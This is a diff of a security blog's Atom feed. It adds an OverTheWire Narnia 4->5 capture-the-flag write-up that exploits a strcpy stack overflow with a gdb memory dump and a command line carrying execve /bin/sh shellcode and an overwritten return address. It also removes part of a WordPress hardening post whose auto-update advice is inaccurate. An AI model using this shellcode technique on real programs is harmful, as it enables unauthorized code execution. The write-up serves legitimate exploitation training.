@@ -1,4 +1,77 @@
-<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xml" href="http://localhost:4000/feed.xslt.xml"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.4.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-03-06T21:20:13+01:00</updated><id>http://localhost:4000//</id><title type="html">Root Network Security</title><subtitle>RootNetSec is a site about journey through the world of network security, pentesting, Linux administration, programming an networking. View to learn more!</subtitle><entry><title type="html">Overthewire.org - Narnia 3 -&amp;gt; 4</title><link href="http://localhost:4000/write-ups/2017/03/05/overthewire.org-narnia-4/" rel="alternate" type="text/html" title="Overthewire.org - Narnia 3 -&gt; 4" /><published>2017-03-05T01:00:00+01:00</published><updated>2017-03-05T01:00:00+01:00</updated><id>http://localhost:4000/write-ups/2017/03/05/overthewire.org-narnia-4</id><content type="html" xml:base="http://localhost:4000/write-ups/2017/03/05/overthewire.org-narnia-4/">&lt;h1&gt;Introduction&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="http://jekyllrb.com" version="3.4.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-03-09T19:55:25+01:00</updated><id>http://localhost:4000/</id><title type="html">Root Network Security</title><subtitle>RootNetSec is a site about journey through the world of network security, pentesting, Linux administration, programming an networking. View to learn more!</subtitle><entry><title type="html">Overthewire.org - Narnia 4 -&amp;gt; 5</title><link href="http://localhost:4000/overthewire/2017/03/09/overthewire.org-narnia-5/" rel="alternate" type="text/html" title="Overthewire.org - Narnia 4 -&gt; 5" /><published>2017-03-09T01:00:00+01:00</published><updated>2017-03-09T01:00:00+01:00</updated><id>http://localhost:4000/overthewire/2017/03/09/overthewire.org-narnia-5</id><content type="html" xml:base="http://localhost:4000/overthewire/2017/03/09/overthewire.org-narnia-5/">&lt;h1&gt;Introduction&lt;/h1&gt;
+
+&lt;p&gt;Today we'll be dealing with another reverse engineering challenge from Overthewire - pretty quick, but fun as always!  &lt;/p&gt;
+
+&lt;h1&gt;Challenge&lt;/h1&gt;
+
+&lt;p&gt;This code is a lot shorter, compared to the previous ones, making it much easier to analyze. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;ctype.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;environ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;environ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;environ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'\0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;environ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]));&lt;/span&gt;
+
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Yeah, we have a buffer of 256 bytes, which gets the content, using dangerous &lt;b&gt;strcpy&lt;/b&gt; function straight from the argument variable. This challenge looks a lot like the second one, so maybe we will also be able to put shellcode somewhere in the buffer? &lt;/p&gt;
+
+&lt;p&gt;Actually, after a little bit of tinktering in &lt;b&gt;gdb&lt;/b&gt;, I've found that providing the binary with 273 &quot;A&quot; letters and 7 &quot;B&quot; letters will overwrite our buffer, together with return address.  &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; run &lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;python -c &lt;span class=&quot;s1&quot;&gt;'print &quot;A&quot; * 272 + &quot;BBBBBBB&quot;'&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
+The program being debugged has been started already.
+Start it from the beginning? &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;y or n&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; y
+
+Starting program: /games/narnia/narnia4 &lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;python -c &lt;span class=&quot;s1&quot;&gt;'print &quot;A&quot; * 272 + &quot;BBBBBBB&quot;'&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; ?? &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now let's take a look at the memory. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;0xffffd800:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd810:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd820:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd830:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd840:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd850:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd860:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd870:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd880:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd890:	0x41414141	0x41414141	0x41414141	0x41414141
+---Type &amp;lt;return&amp;gt; to continue, or q &amp;lt;return&amp;gt; to quit---
+0xffffd8a0: 0x41414141  0x41414141  0x41414141  0x41414141
+0xffffd8b0: 0x41414141  0x41414141  0x42424141  0x42424242
+0xffffd8c0: 0x00004242  0x00000000  0x00000000  0x00000000
+0xffffd8d0: 0x00000000  0x00000000  0x00000000  0x00000000
+0xffffd8e0: 0x00000000  0x00000000  0x00000000  0x00000000&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;From this we know that I have somewhere around 272 bytes for the shellcode with some additional bytes that will overwrite the return address. Now we can construct the command, using code from the previous levels. &lt;/p&gt;
+
+&lt;p&gt;As we know already that our payload is 25 bytes in size, we will have to firstly write 247 &quot;A&quot; letters, then 25 bytes of shellcode and lastly overwriting the &lt;b&gt;EIP register&lt;/b&gt;, which then will be placed somewhere in the middle of &quot;A&quot; letters. By looking at the debug of the memory, I'm going to choose it as &lt;b&gt;0xffffd850&lt;/b&gt;.  &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;narnia4@melinda:/narnia$ &lt;/span&gt;./narnia4 &lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;python -c&lt;span class=&quot;s1&quot;&gt;'print &quot;A&quot; * 247 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&quot; + &quot;\x50\xd8\xff\xff&quot;'&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;cat /etc/narnia_pass/narnia5
+&lt;span class=&quot;k&quot;&gt;********&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Once again we have the password to the next level! &lt;/p&gt;
+
+&lt;h1&gt;Conclusion&lt;/h1&gt;
+&lt;p&gt;Another big thanks  to &lt;a href=&quot;http://overthewire.org/wargames/&quot;&gt;OverTheWire&lt;/a&gt;! I'm looking forward to the next challenges! &lt;/p&gt;
+
+&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Overthewire" /><summary type="html">Introduction</summary></entry><entry><title type="html">Overthewire.org - Narnia 3 -&amp;gt; 4</title><link href="http://localhost:4000/overthewire/2017/03/05/overthewire.org-narnia-4/" rel="alternate" type="text/html" title="Overthewire.org - Narnia 3 -&gt; 4" /><published>2017-03-05T01:00:00+01:00</published><updated>2017-03-05T01:00:00+01:00</updated><id>http://localhost:4000/overthewire/2017/03/05/overthewire.org-narnia-4</id><content type="html" xml:base="http://localhost:4000/overthewire/2017/03/05/overthewire.org-narnia-4/">&lt;h1&gt;Introduction&lt;/h1&gt;
 
 &lt;p&gt;Let's go back to another reverse engineering challenge from OverTheWire. Today we'll be dealing with a little different type of buffer overflow.  &lt;/p&gt;
 
@@ -100,7 +173,7 @@ narnia3@melinda:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAW/tmp$ cat /tmp/w3ndige
 &lt;h1&gt;Conclusion&lt;/h1&gt;
 &lt;p&gt;Once gain thanks &lt;a href=&quot;http://overthewire.org/wargames/&quot;&gt;OverTheWire&lt;/a&gt;! I'm definitely looking forward to new challenges from &lt;b&gt;Narnia&lt;/b&gt;, as I'm getting more and more interested in reverse engineering. &lt;/p&gt;
 
-&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Write-Ups" /><summary type="html">Introduction</summary></entry><entry><title type="html">Nmap</title><link href="http://localhost:4000/cheat%20sheets/2017/02/25/nmap-cheat-sheet/" rel="alternate" type="text/html" title="Nmap" /><published>2017-02-25T01:00:00+01:00</published><updated>2017-02-25T01:00:00+01:00</updated><id>http://localhost:4000/cheat%20sheets/2017/02/25/nmap-cheat-sheet</id><content type="html" xml:base="http://localhost:4000/cheat%20sheets/2017/02/25/nmap-cheat-sheet/">&lt;h1&gt;What is Nmap?&lt;/h1&gt;
+&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Overthewire" /><summary type="html">Introduction</summary></entry><entry><title type="html">Nmap</title><link href="http://localhost:4000/cheat%20sheets/2017/02/25/nmap-cheat-sheet/" rel="alternate" type="text/html" title="Nmap" /><published>2017-02-25T01:00:00+01:00</published><updated>2017-02-25T01:00:00+01:00</updated><id>http://localhost:4000/cheat%20sheets/2017/02/25/nmap-cheat-sheet</id><content type="html" xml:base="http://localhost:4000/cheat%20sheets/2017/02/25/nmap-cheat-sheet/">&lt;h1&gt;What is Nmap?&lt;/h1&gt;
 
 &lt;p&gt;&lt;b&gt;Nmap&lt;/b&gt;, short for network mapper, is an open source security tool for network exploration, security scanning and auditing. It was originally written by Gordon Lyon AKA Fyodor, firstly published in September 1997 in a &lt;a href=&quot;http://phrack.org/issues/51/11.html&quot;&gt;Phrack Magazine&lt;/a&gt;, with included source code. &lt;/p&gt;
 
@@ -1141,7 +1214,7 @@ base64 -d /var/local/.luke|less.real&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 &lt;h1&gt;References&lt;/h1&gt;
 &lt;p&gt;[1] &lt;a href=&quot;https://en.wikipedia.org/wiki/Enigma_machine&quot;&gt;&lt;b&gt;Wikipedia&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;[2] Singh Simon (2000) &lt;b&gt;The Code Book: The Science of Secrecy from Ancient Egypt to Quantum Cryptography&lt;/b&gt;&lt;/p&gt;
-&lt;p&gt;[3] Rejewski Marian (1981) &lt;b&gt;How the Polish Mathematicians Broke the Enigma. Annals of the History of Computing.&lt;/b&gt;&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Cryptography" /><summary type="html">Brief history behind Enigma</summary></entry><entry><title type="html">Overthewire.org - Narnia 2 -&amp;gt; 3</title><link href="http://localhost:4000/write-ups/2017/02/03/overthewire.org-narnia-3/" rel="alternate" type="text/html" title="Overthewire.org - Narnia 2 -&gt; 3" /><published>2017-02-03T01:00:00+01:00</published><updated>2017-02-03T01:00:00+01:00</updated><id>http://localhost:4000/write-ups/2017/02/03/overthewire.org-narnia-3</id><content type="html" xml:base="http://localhost:4000/write-ups/2017/02/03/overthewire.org-narnia-3/">&lt;h1&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;[3] Rejewski Marian (1981) &lt;b&gt;How the Polish Mathematicians Broke the Enigma. Annals of the History of Computing.&lt;/b&gt;&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Cryptography" /><summary type="html">Brief history behind Enigma</summary></entry><entry><title type="html">Overthewire.org - Narnia 2 -&amp;gt; 3</title><link href="http://localhost:4000/overthewire/2017/02/03/overthewire.org-narnia-3/" rel="alternate" type="text/html" title="Overthewire.org - Narnia 2 -&gt; 3" /><published>2017-02-03T01:00:00+01:00</published><updated>2017-02-03T01:00:00+01:00</updated><id>http://localhost:4000/overthewire/2017/02/03/overthewire.org-narnia-3</id><content type="html" xml:base="http://localhost:4000/overthewire/2017/02/03/overthewire.org-narnia-3/">&lt;h1&gt;Introduction&lt;/h1&gt;
 
 &lt;p&gt;What about another challenge in reverse engineering? Anywhere, anytime! &lt;/p&gt;
 
@@ -1287,7 +1360,7 @@ $ cat /etc/narnia_pass/narnia3&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 &lt;h1&gt;Conclusion&lt;/h1&gt;
 &lt;p&gt;The challenge was awesome, but really time consuming. It was worth every minute as I learned a lot from trying out these different ways to finish this level. Thanks &lt;a href=&quot;http://overthewire.org/wargames/&quot;&gt;OverTheWire&lt;/a&gt;!&lt;/p&gt;
 
-&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Write-Ups" /><summary type="html">Introduction</summary></entry><entry><title type="html">Overthewire.org - Narnia 1 -&amp;gt; 2</title><link href="http://localhost:4000/write-ups/2017/02/02/overthewire.org-narnia-2/" rel="alternate" type="text/html" title="Overthewire.org - Narnia 1 -&gt; 2" /><published>2017-02-02T01:00:00+01:00</published><updated>2017-02-02T01:00:00+01:00</updated><id>http://localhost:4000/write-ups/2017/02/02/overthewire.org-narnia-2</id><content type="html" xml:base="http://localhost:4000/write-ups/2017/02/02/overthewire.org-narnia-2/">&lt;h1&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Overthewire" /><summary type="html">Introduction</summary></entry><entry><title type="html">Overthewire.org - Narnia 1 -&amp;gt; 2</title><link href="http://localhost:4000/overthewire/2017/02/02/overthewire.org-narnia-2/" rel="alternate" type="text/html" title="Overthewire.org - Narnia 1 -&gt; 2" /><published>2017-02-02T01:00:00+01:00</published><updated>2017-02-02T01:00:00+01:00</updated><id>http://localhost:4000/overthewire/2017/02/02/overthewire.org-narnia-2</id><content type="html" xml:base="http://localhost:4000/overthewire/2017/02/02/overthewire.org-narnia-2/">&lt;h1&gt;Introduction&lt;/h1&gt;
 &lt;p&gt;Another month, another challenge, next part of OverTheWire's Narnia wargames. Unfortunately lack of time, made it impossible for me to publish anything sooner. Sorry for that!&lt;/p&gt;
 
 &lt;h1&gt;Challenge&lt;/h1&gt;
@@ -1350,8 +1423,7 @@ $ cat /etc/narnia_pass/narnia2&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&
 &lt;p&gt;&lt;b&gt;UPDATE&lt;/b&gt;&lt;/p&gt;
 &lt;p&gt;To gain better insight into who visits my website, I decided to add Piwik Analytics as a way to both give me essential information, and to repsect your privacy. You can read more at the &lt;a href=&quot;/privacy/&quot;&gt;Privacy Policy&lt;/a&gt;, but if you still have any questions, contact me and I'll try my best to answer. &lt;/p&gt;
 
-&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Write-Ups" /><summary type="html">Introduction
-Another month, another challenge, next part of OverTheWire's Narnia wargames. Unfortunately lack of time, made it impossible for me to publish anything sooner. Sorry for that!</summary></entry><entry><title type="html">Overthewire.org - Narnia 0 -&amp;gt; 1</title><link href="http://localhost:4000/write-ups/2017/01/01/overthewire.org-narnia-1/" rel="alternate" type="text/html" title="Overthewire.org - Narnia 0 -&gt; 1" /><published>2017-01-01T01:00:00+01:00</published><updated>2017-01-01T01:00:00+01:00</updated><id>http://localhost:4000/write-ups/2017/01/01/overthewire.org-narnia-1</id><content type="html" xml:base="http://localhost:4000/write-ups/2017/01/01/overthewire.org-narnia-1/">&lt;h1&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Overthewire" /><summary type="html">Introduction Another month, another challenge, next part of OverTheWire's Narnia wargames. Unfortunately lack of time, made it impossible for me to publish anything sooner. Sorry for that!</summary></entry><entry><title type="html">Overthewire.org - Narnia 0 -&amp;gt; 1</title><link href="http://localhost:4000/overthewire/2017/01/01/overthewire.org-narnia-1/" rel="alternate" type="text/html" title="Overthewire.org - Narnia 0 -&gt; 1" /><published>2017-01-01T01:00:00+01:00</published><updated>2017-01-01T01:00:00+01:00</updated><id>http://localhost:4000/overthewire/2017/01/01/overthewire.org-narnia-1</id><content type="html" xml:base="http://localhost:4000/overthewire/2017/01/01/overthewire.org-narnia-1/">&lt;h1&gt;Introduction&lt;/h1&gt;
 
 &lt;p&gt;As a part of my New Year's resolutions I decided to improve my knowledge of binary exploitation, learn more by completing challenges from &lt;a href=&quot;http://overthewire.org/wargames/&quot;&gt;OverTheWire&lt;/a&gt;, especially Narnia, as they are aimed to people wanting to learn about basics. &lt;/p&gt;
 
@@ -1426,7 +1498,7 @@ cat /etc/narnia_pass/narnia1
 
 &lt;p&gt;As I never tought before, this was a great challenge, and I think I got more interested in binary exploitation and reverse engineering. Can't wait to try out some other challenges, and I'll see you in the next one!&lt;/p&gt;
 
-&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Write-Ups" /><summary type="html">Introduction</summary></entry><entry><title type="html">Overthewire.org - Natas</title><link href="http://localhost:4000/write-ups/2016/12/25/overthewire.org-natas/" rel="alternate" type="text/html" title="Overthewire.org - Natas" /><published>2016-12-25T01:00:00+01:00</published><updated>2016-12-25T01:00:00+01:00</updated><id>http://localhost:4000/write-ups/2016/12/25/overthewire.org-natas</id><content type="html" xml:base="http://localhost:4000/write-ups/2016/12/25/overthewire.org-natas/">&lt;h1&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Overthewire" /><summary type="html">Introduction</summary></entry><entry><title type="html">Overthewire.org - Natas</title><link href="http://localhost:4000/overthewire/2016/12/25/overthewire.org-natas/" rel="alternate" type="text/html" title="Overthewire.org - Natas" /><published>2016-12-25T01:00:00+01:00</published><updated>2016-12-25T01:00:00+01:00</updated><id>http://localhost:4000/overthewire/2016/12/25/overthewire.org-natas</id><content type="html" xml:base="http://localhost:4000/overthewire/2016/12/25/overthewire.org-natas/">&lt;h1&gt;Introduction&lt;/h1&gt;
 
 &lt;p&gt;Welcome back to another OverTheWire wargame called &quot;Leviathan&quot; - which is made only of tasks connected to web security. As the number of exercises is very big (33 at the time of publishing this post), I will break it down in a few smaller parts. Without wasting your time, let's get started! &lt;/p&gt;
 
@@ -1681,7 +1753,7 @@ dictionary.txt:Allah's
 
 &lt;p&gt;See you in the next one!&lt;/p&gt;
 
-&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Write-Ups" /><summary type="html">Introduction</summary></entry><entry><title type="html">Summary of 2016</title><link href="http://localhost:4000/news/2016/12/14/what-has-happened/" rel="alternate" type="text/html" title="Summary of 2016" /><published>2016-12-14T01:00:00+01:00</published><updated>2016-12-14T01:00:00+01:00</updated><id>http://localhost:4000/news/2016/12/14/what-has-happened</id><content type="html" xml:base="http://localhost:4000/news/2016/12/14/what-has-happened/">&lt;h1&gt;Hey guys!&lt;/h1&gt;
+&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Overthewire" /><summary type="html">Introduction</summary></entry><entry><title type="html">Summary of 2016</title><link href="http://localhost:4000/news/2016/12/14/what-has-happened/" rel="alternate" type="text/html" title="Summary of 2016" /><published>2016-12-14T01:00:00+01:00</published><updated>2016-12-14T01:00:00+01:00</updated><id>http://localhost:4000/news/2016/12/14/what-has-happened</id><content type="html" xml:base="http://localhost:4000/news/2016/12/14/what-has-happened/">&lt;h1&gt;Hey guys!&lt;/h1&gt;
 &lt;hr /&gt;
 
 &lt;p&gt;As 2016 is getting closer to the end, I wanted to give you some brief insight in what has been happening in the past month or so, with additional information about updates on RootNetSec and plans for the future. &lt;/p&gt;
@@ -1723,137 +1795,4 @@ dictionary.txt:Allah's
 
 &lt;p&gt;If you came so far down, I wanted to say once again - thank you. And as always - stay safe, keep learning and I'll see you in a few weeks! &lt;/p&gt;
 
-&lt;p&gt;~ W3ndige&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="News" /><summary type="html">Hey guys!</summary></entry><entry><title type="html">Hardening WordPress</title><link href="http://localhost:4000/web%20security/2016/12/04/hardening-wordpress/" rel="alternate" type="text/html" title="Hardening WordPress" /><published>2016-12-04T01:00:00+01:00</published><updated>2016-12-04T01:00:00+01:00</updated><id>http://localhost:4000/web%20security/2016/12/04/hardening-wordpress</id><content type="html" xml:base="http://localhost:4000/web%20security/2016/12/04/hardening-wordpress/">&lt;h1&gt;Introduction&lt;/h1&gt;
-
-&lt;p&gt;WordPress is the most popular content management system (27.2% of all websites in 2016), bringing an ease in creating websites even for non technical users. Perfect option? Unfortunately not, as WordPress is also the most hacked platform (around 70% of all hacked CMS are WordPress based sites). &lt;/p&gt;
-
-&lt;p&gt;Is it because it's so popular? Maybe because many people don't have basic technical knowledge allowing to secure these platforms? Or because people create these websites and then forget about updating? I leave it to your answer. &lt;/p&gt;
-
-&lt;p&gt;Today we're going to focus on ways to secure your site, making it harder to get hacked. &lt;/p&gt;
-
-&lt;h1&gt;Keep your WordPress up to date&lt;/h1&gt;
-
-&lt;p&gt;First and the most important thing is to always keep your site updated, as well as plugins and themes that you're using as developers are working hard to secure all the reported flaws. A lot of sites were hacked by vulnerabilities in code of old plugins, or WordPress core, which were updated in the newer versions. &lt;/p&gt;
-
-&lt;p&gt;If you don't want to come back to your website as often, to only check for updates, consider auto update option. You can do this by using one of two methods - by defining constant in wp-config.php or by adding plugins. &lt;/p&gt;
-
-&lt;p&gt;&lt;b&gt;wp-config.php&lt;/b&gt;&lt;/p&gt;
-
-&lt;p&gt;To enable automatic updates define this constant: &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;define( 'AUTOMATIC_UPDATER_DISABLED', true );&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;ul&gt;
-&lt;li&gt;True – Development, minor, and major updates are all enabled&lt;/li&gt;
-&lt;li&gt;False – Development, minor, and major updates are all disabled&lt;/li&gt;
-&lt;li&gt;'minor' – Minor updates are enabled, development, and major updates are disabled&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;For plugins: &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;add_filter( 'auto_update_plugin', '__return_true' );&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;For themes: &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;add_filter( 'auto_update_theme', '__return_true' );&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;h1&gt;Use strong credentials!&lt;/h1&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;b&gt;Strong passwords.&lt;/b&gt;&lt;/li&gt;
-&lt;li&gt;&lt;b&gt;Don't use admin as username.&lt;/b&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Not only people will try to attack your site. There are bots that will try to access your &lt;i&gt;wp-admin&lt;/i&gt; page and brute force your password, preferably using &lt;i&gt;admin&lt;/i&gt; as username. So it's essential to have strong password, but also by changing the username to something less obvious. That way attacker will also have to find it, along with the password.  &lt;/p&gt;
-
-&lt;p&gt;For passwords, I can reccomend generators from apps like KeePass or LastPass. Your password have to be &lt;b&gt;CLU&lt;/b&gt;: Complex. Long. Unique.&lt;/p&gt;
-
-&lt;p&gt;Another security practice is having two accounts - one working as admin and second for publication. Publication account should be used while adding blog posts, content that don't require admin privilages, and while using some public internet access. That way, even if somehow attacker gained access to your password, privilages of publication account won't allow him to do much more harm, than while being logged as admin. &lt;/p&gt;
-
-&lt;p&gt;Also - &lt;b&gt;consider two factor authentication!&lt;/b&gt;&lt;/p&gt;
-
-&lt;h1&gt;Think about your plugins!&lt;/h1&gt;
-
-&lt;p&gt;If you're not using a plugin, it's deactivated - simply, delete it. It's known to attack a site, by exploiting flaws in the plugin that the developer wasn't even using. But why it happens? After deactivating the plugin - its file are still in the WordPress directory waiting to be used once again. Or maybe waiting to be hacked? &lt;/p&gt;
-
